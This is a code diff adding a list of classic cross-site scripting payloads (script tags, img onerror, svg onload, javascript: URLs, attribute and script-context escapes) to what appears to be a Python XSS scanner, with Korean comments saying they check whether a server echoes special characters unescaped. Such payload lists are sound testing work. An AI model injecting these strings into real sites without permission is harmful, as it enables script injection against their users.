@@ -149,6 +149,38 @@ def _build_vectors():
 
 VECTORS = _build_vectors()
 
+
+# ─────────── 고전/탈출 payload — 출력이 이스케이프되지 않는 경우를 노린다 ───────────
+# 위 VECTORS 가 '자동 발화 이벤트' 라면, 아래는 가장 기본적인 주입·문맥 탈출 문자열이다.
+# 서버가 특수문자를 그대로 내보내면(이스케이프 안 함) 이 원문이 응답에 그대로 남는다.
+# 형식은 VECTORS 와 같은 (이름, 문맥, 템플릿) — 재사용하는 쪽에서 똑같이 다룬다.
+CLASSIC_VECTORS = (
+    ("script", "HTML 본문", "<script>{H}</script>"),
+    ("script", "대소문자 변형", "<ScRiPt>{H}</ScRiPt>"),
+    ("script", "공백 변형", "<script >{H}</script >"),
+    ("img", "HTML 본문(따옴표 없음)", "<img src=x onerror={H}>"),
+    ("img", "HTML 본문(따옴표)", '<img src="x" onerror="{H}">'),
+    ("svg", "HTML 본문", "<svg onload={H}>"),
+    ("svg", "자가닫힘", "<svg/onload={H}>"),
+    ("body", "HTML 본문", "<body onload={H}>"),
+    ("iframe", "javascript: 스킴", '<iframe src="javascript:{H}"></iframe>'),
+    ("a", "javascript: 스킴", '<a href="javascript:{H}">x</a>'),
+    ("attr", "속성 탈출(겹따옴표)", '"><script>{H}</script>'),
+    ("attr", "속성 탈출(홑따옴표)", "'><script>{H}</script>"),
+    ("attr", "속성 탈출(img)", '"><img src=x onerror={H}>'),
+    ("attr", "속성 내 이벤트 주입", '" onmouseover="{H}" x="'),
+    ("attr", "속성 내 autofocus", '" autofocus onfocus="{H}" x="'),
+    ("script-ctx", "스크립트 문자열 탈출", "';{H};//"),
+    ("script-ctx", "스크립트 블록 탈출", "</script><script>{H}</script>"),
+    ("textarea", "textarea 탈출", "</textarea><script>{H}</script>"),
+    ("title", "title 탈출", "</title><script>{H}</script>"),
+    ("comment", "HTML 주석 탈출", "--><script>{H}</script>"),
+    ("img", "onerror 슬래시 변형", "<img src=x onerror={H}//>"),
+    ("details", "ontoggle", "<details open ontoggle={H}><summary>x</summary></details>"),
+    ("marquee", "onstart", "<marquee onstart={H}>x</marquee>"),
+    ("input", "autofocus onfocus", "<input autofocus onfocus={H}>"),
+)
+
 TEXT_OR_INERT = {
     "script", "style", "textarea", "title", "template", "noscript",
     "xmp", "iframe", "noembed", "noframes", "plaintext",
